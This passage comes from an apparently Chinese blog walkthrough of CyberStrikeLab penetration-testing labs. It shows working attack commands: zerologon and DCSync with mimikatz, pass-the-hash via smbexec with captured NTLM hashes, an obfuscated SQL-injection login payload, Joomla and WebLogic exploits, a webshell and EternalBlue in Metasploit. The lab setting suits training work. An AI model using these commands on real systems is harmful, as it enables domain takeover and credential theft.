<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ping -a 192.168.20.30
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117210402871.png"
	width="861"
	height="459"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117210402871_hu6034205282148419368.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117210402871_hu13170445116058428365.png 1024w"
	loading="lazy"
	
		alt="image-20260117210402871"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="450px"
	
></p>
<p>获得主机名之后可以尝试用<code>zorologon</code>尝试置空密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz.exe
</span></span><span class="line"><span class="cl">privilege::debug 
</span></span><span class="line"><span class="cl">lsadump::zerologon /target:192.168.20.30 /account:WIN-7NRTJO59O7N$
</span></span></code></pre></td></tr></table>
</div>
</div><p>检测到确实有</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117211149932.png"
	width="1093"
	height="642"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117211149932_hu1755279673542515792.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117211149932_hu9632094125997243776.png 1024w"
	loading="lazy"
	
		alt="image-20260117211149932"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="408px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lsadump::zerologon /target:192.168.20.30  /ntlm /null /account:WIN-7NRTJO59O7N$ /exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117211820882.png"
	width="1480"
	height="603"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117211820882_hu456565658344114614.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117211820882_hu4315883732597961966.png 1024w"
	loading="lazy"
	
		alt="image-20260117211820882"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="589px"
	
></p>
<p>直接打</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lsadump::dcsync /csv /domain:cyberstrikelab.com /dc:WIN-7NRTJO59O7N.cyberstrikelab.com /user:administrator /authuser:WIN-7NRTJO59O7N$ /authpassword:&#34;&#34; /authntlm
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117212344412.png"
	width="1052"
	height="328"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117212344412_hu4188099809800172009.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117212344412_hu5948155669126536600.png 1024w"
	loading="lazy"
	
		alt="image-20260117212344412"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="769px"
	
></p>
<p>有了之后直接打PTH（发现在<code>stowaway</code>这里也可以执行mimikatz还能直接复制粘贴，这样就很快了）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :00f995cbe63fd30411f44d434b8dac98 cyberstrikelab.com/administrator@192.168.20.30
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213755360.png"
	width="1114"
	height="212"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213755360_hu2958561840820607140.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213755360_hu13098990203901259718.png 1024w"
	loading="lazy"
	
		alt="image-20260117213755360"
	
	
		class="gallery-image" 
		data-flex-grow="525"
		data-flex-basis="1261px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213838822.png"
	width="368"
	height="72"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213838822_hu8948345340049210987.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213838822_hu507163822549275505.png 1024w"
	loading="lazy"
	
		alt="image-20260117213838822"
	
	
		class="gallery-image" 
		data-flex-grow="511"
		data-flex-basis="1226px"
	
></p>
<p>然后20也可以打</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213940121.png"
	width="984"
	height="173"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213940121_hu6779254112507763605.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117213940121_hu14539497880533707785.png 1024w"
	loading="lazy"
	
		alt="image-20260117213940121"
	
	
		class="gallery-image" 
		data-flex-grow="568"
		data-flex-basis="1365px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117214016736.png"
	width="433"
	height="90"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117214016736_hu13998733602786697763.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117214016736_hu7176268380310254431.png 1024w"
	loading="lazy"
	
		alt="image-20260117214016736"
	
	
		class="gallery-image" 
		data-flex-grow="481"
		data-flex-basis="1154px"
	
></p>
<h2 id="lab5">lab5
</h2><h3 id="flag1-4">flag1
</h3><h4 id="知识点beemcms">知识点：BEEMCMS
</h4><p><code>fscan</code>之后依旧要扫描端口</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119113008415.png"
	width="1685"
	height="286"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119113008415_hu9843338134612469302.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119113008415_hu9446059883079036825.png 1024w"
	loading="lazy"
	
		alt="image-20260119113008415"
	
	
		class="gallery-image" 
		data-flex-grow="589"
		data-flex-basis="1413px"
	
></p>
<p>得到<code>6582</code>，进/admin</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114148828.png"
	width="954"
	height="513"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114148828_hu6616895215053466166.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114148828_hu16550884027874842148.png 1024w"
	loading="lazy"
	
		alt="image-20260119114148828"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="446px"
	
></p>
<p>存在sql注入漏洞，我们可以通过union select 使得admin用户的密码重置为123456</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39;+uniselecton+selselectect+1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,0,0+%23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user=-1&#39;+uniselecton+selselectect+1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,0,0+%23&amp;password=123456&amp;code=4cf5&amp;submit=true&amp;submit.x=40&amp;submit.y=41
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114801410.png"
	width="1311"
	height="633"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114801410_hu2040955938722764620.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114801410_hu8869232460616447109.png 1024w"
	loading="lazy"
	
		alt="image-20260119114801410"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="497px"
	
></p>
<p>放到拦截处放包即可跳转</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114828631.png"
	width="1984"
	height="950"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114828631_hu15955295039172931360.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119114828631_hu18341829934671264715.png 1024w"
	loading="lazy"
	
		alt="image-20260119114828631"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="501px"
	
></p>
<p>在logo处可以MIMI绕过，上传php</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119115134775.png"
	width="822"
	height="341"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119115134775_hu2706479375727989138.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119115134775_hu8930689072834441807.png 1024w"
	loading="lazy"
	
		alt="image-20260119115134775"
	
	
		class="gallery-image" 
		data-flex-grow="241"
		data-flex-basis="578px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119115124710.png"
	width="1200"
	height="383"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119115124710_hu9908994018262611227.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119115124710_hu12322863834008436823.png 1024w"
	loading="lazy"
	
		alt="image-20260119115124710"
	
	
		class="gallery-image" 
		data-flex-grow="313"
		data-flex-basis="751px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119120010432.png"
	width="568"
	height="257"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119120010432_hu16116642132014353211.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119120010432_hu14132802047203319851.png 1024w"
	loading="lazy"
	
		alt="image-20260119120010432"
	
	
		class="gallery-image" 
		data-flex-grow="221"
		data-flex-basis="530px"
	
></p>
<h3 id="flag2-3">flag2
</h3><h4 id="知识点zerologonpth">知识点：<code>zerologon</code>+PTH
</h4><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119120518213.png"
	width="948"
	height="449"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119120518213_hu649606923925696196.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119120518213_hu6769452988134745828.png 1024w"
	loading="lazy"
	
		alt="image-20260119120518213"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="506px"
	
></p>
<p>发现20的8080有一个JBoss的web服务</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119121750709.png"
	width="1692"
	height="668"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119121750709_hu16518739200580673874.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119121750709_hu12761229749357334232.png 1024w"
	loading="lazy"
	
		alt="image-20260119121750709"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="607px"
	
></p>
<p>看了一圈先试试能不能用<code>zerologon</code></p>
<p>跟之前一模一样，直接到手了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119122708786.png"
	width="1158"
	height="353"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119122708786_hu4444440450280169711.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119122708786_hu10750900341438128027.png 1024w"
	loading="lazy"
	
		alt="image-20260119122708786"
	
	
		class="gallery-image" 
		data-flex-grow="328"
		data-flex-basis="787px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">90bc407917c39080424e9119821e200a
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接<code>PTH</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :90bc407917c39080424e9119821e200a cyberstrikelab.com/administrator@192.168.20.20
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119123927142.png"
	width="1084"
	height="453"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119123927142_hu8447711291454926916.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260119123927142_hu7938802762518257316.png 1024w"
	loading="lazy"
	
		alt="image-20260119123927142"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="574px"
	
></p>
<h2 id="lab6">lab6
</h2><h3 id="flag1-5">flag1
</h3><h4 id="知识点joomla历史漏洞">知识点：joomla历史漏洞
</h4><p>joomla站点，用joomscan扫描出来，发现有nday</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120180949481.png"
	width="1549"
	height="393"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120180949481_hu10514971481495462019.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120180949481_hu4206192859259976779.png 1024w"
	loading="lazy"
	
		alt="image-20260120180949481"
	
	
		class="gallery-image" 
		data-flex-grow="394"
		data-flex-basis="945px"
	
></p>
<p><a class="link" href="https://github.com/kiks7/rusty_joomla_rce"  target="_blank" rel="noopener"
    >kiks7/rusty_joomla_rce: Rusty Joomla RCE Exploit</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python rusty_joomla_exploit.py -t http://192.168.10.10/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python rusty_joomla_exploit.py -t http://192.168.10.10/ -e
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181223672.png"
	width="1696"
	height="384"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181223672_hu12681048246080920286.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181223672_hu2468108563954572241.png 1024w"
	loading="lazy"
	
		alt="image-20260120181223672"
	
	
		class="gallery-image" 
		data-flex-grow="441"
		data-flex-basis="1060px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181327169.png"
	width="1040"
	height="732"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181327169_hu16820971346895472159.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181327169_hu12880907991235422435.png 1024w"
	loading="lazy"
	
		alt="image-20260120181327169"
	
	
		class="gallery-image" 
		data-flex-grow="142"
		data-flex-basis="340px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181352197.png"
	width="552"
	height="236"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181352197_hu13084290556802112807.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120181352197_hu16499499772821074105.png 1024w"
	loading="lazy"
	
		alt="image-20260120181352197"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="561px"
	
></p>
<h3 id="flag2-4">flag2
</h3><h4 id="知识点welogic历史漏洞">知识点：welogic历史漏洞
</h4><p>一开始以为也可以直接打zerologon，发现不行，还是乖乖上传fscan</p>
<p>不是，原来10这个网段根本什么都没有，乖乖fscan发现有10.20</p>
<p>7001端口存在<code>weblogic</code>框架</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183055903.png"
	width="1799"
	height="460"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183055903_hu8715945753958399810.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183055903_hu8835272217464267864.png 1024w"
	loading="lazy"
	
		alt="image-20260120183055903"
	
	
		class="gallery-image" 
		data-flex-grow="391"
		data-flex-basis="938px"
	
></p>
<p>用工具扫一下，发现有历史漏洞</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183503327.png"
	width="786"
	height="324"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183503327_hu16418828915316877012.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183503327_hu4042467217700207663.png 1024w"
	loading="lazy"
	
		alt="image-20260120183503327"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="582px"
	
></p>
<p>可以执行命令</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183541092.png"
	width="1255"
	height="838"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183541092_hu8794603337180914347.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183541092_hu12146804353896589843.png 1024w"
	loading="lazy"
	
		alt="image-20260120183541092"
	
	
		class="gallery-image" 
		data-flex-grow="149"
		data-flex-basis="359px"
	
></p>
<p>直接打内存马进去</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183742189.png"
	width="1353"
	height="220"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183742189_hu9679686284440074796.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183742189_hu10853529556178135325.png 1024w"
	loading="lazy"
	
		alt="image-20260120183742189"
	
	
		class="gallery-image" 
		data-flex-grow="615"
		data-flex-basis="1476px"
	
></p>
<p>记得改变连接类型</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183724911.png"
	width="1130"
	height="817"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183724911_hu6875984060619772803.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183724911_hu7073317322762050767.png 1024w"
	loading="lazy"
	
		alt="image-20260120183724911"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="331px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183825821.png"
	width="830"
	height="295"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183825821_hu5540615206023244199.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120183825821_hu3321240165081439556.png 1024w"
	loading="lazy"
	
		alt="image-20260120183825821"
	
	
		class="gallery-image" 
		data-flex-grow="281"
		data-flex-basis="675px"
	
></p>
<h3 id="flag3-3">flag3
</h3><h4 id="知识点永恒之蓝-1">知识点：永恒之蓝
</h4><p>上传stowaway，发现64和86都运行不了，直接开RDP登录了，然后在rdp登录处就可以运行64，也许是内存马的原因</p>
<p>fscan发现30机子有永恒之蓝</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120190254359.png"
	width="1684"
	height="547"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120190254359_hu2651284192423882675.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120190254359_hu13117010670009022127.png 1024w"
	loading="lazy"
	
		alt="image-20260120190254359"
	
	
		class="gallery-image" 
		data-flex-grow="307"
		data-flex-basis="738px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">search ms17
</span></span><span class="line"><span class="cl">use 2
</span></span><span class="line"><span class="cl">set RHOSTS 192.168.20.30
</span></span><span class="line"><span class="cl">set command type c:\\flag.txt
</span></span><span class="line"><span class="cl">run
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120191022352.png"
	width="844"
	height="310"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120191022352_hu6530106816545020170.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120191022352_hu2721739846130156467.png 1024w"
	loading="lazy"
	
		alt="image-20260120191022352"
	
	
		class="gallery-image" 
		data-flex-grow="272"
		data-flex-basis="653px"
	
></p>
<h2 id="lab7">lab7
</h2><p>有点同质了，考的都是差不多的点，要么就<code>zerologon</code>然后打<code>PTH</code>，要么就直接抓哈希打<code>PTH</code></p>
<h3 id="flag1-6">flag1
</h3><h4 id="知识点bagecms历史漏洞">知识点：<code>bagecms</code>历史漏洞
</h4><p><code>fscan</code>一下，可以发现外网只有一台机子</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120210421354.png"
	width="1812"
	height="202"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120210421354_hu1075098888708300723.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120210421354_hu14104751773639172269.png 1024w"
	loading="lazy"
	
		alt="image-20260120210421354"
	
	
		class="gallery-image" 
		data-flex-grow="897"
		data-flex-basis="2152px"
	
></p>
<p>进入发现是<code>bageCMS</code>直接搜一波历史漏洞，在nday中可以找到登录界面在哪</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.10.10:9652/index.php?r=admini/public/login
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120210833565.png"
	width="1609"
	height="998"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120210833565_hu8269043321200066649.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120210833565_hu10495783590831096955.png 1024w"
	loading="lazy"
	
		alt="image-20260120210833565"
	
	
		class="gallery-image" 
		data-flex-grow="161"
		data-flex-basis="386px"
	
></p>
<p>有验证码，但是弱口令admin/admin123456，进入后在模板处修改index.php，当然修改别的也可以</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211245399.png"
	width="1200"
	height="1119"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211245399_hu1927601617207877544.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211245399_hu5755063604486354287.png 1024w"
	loading="lazy"
	
		alt="image-20260120211245399"
	
	
		class="gallery-image" 
		data-flex-grow="107"
		data-flex-basis="257px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211512102.png"
	width="686"
	height="351"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211512102_hu534879019743454683.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211512102_hu14443561993234286391.png 1024w"
	loading="lazy"
	
		alt="image-20260120211512102"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="469px"
	
></p>
<p>蚁剑连接</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211601608.png"
	width="1132"
	height="819"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211601608_hu6178240620807587978.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211601608_hu15047153717183759254.png 1024w"
	loading="lazy"
	
		alt="image-20260120211601608"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="331px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211611608.png"
	width="423"
	height="292"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211611608_hu13618022351337193405.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120211611608_hu17904814149268198388.png 1024w"
	loading="lazy"
	
		alt="image-20260120211611608"
	
	
		class="gallery-image" 
		data-flex-grow="144"
		data-flex-basis="347px"
	
></p>
<h3 id="flag2-5">flag2
</h3><h4 id="知识点永恒之蓝-2">知识点：永恒之蓝
</h4><p>建立连接之后<code>fscan</code>，发现40机里面有一个永恒之蓝</p>
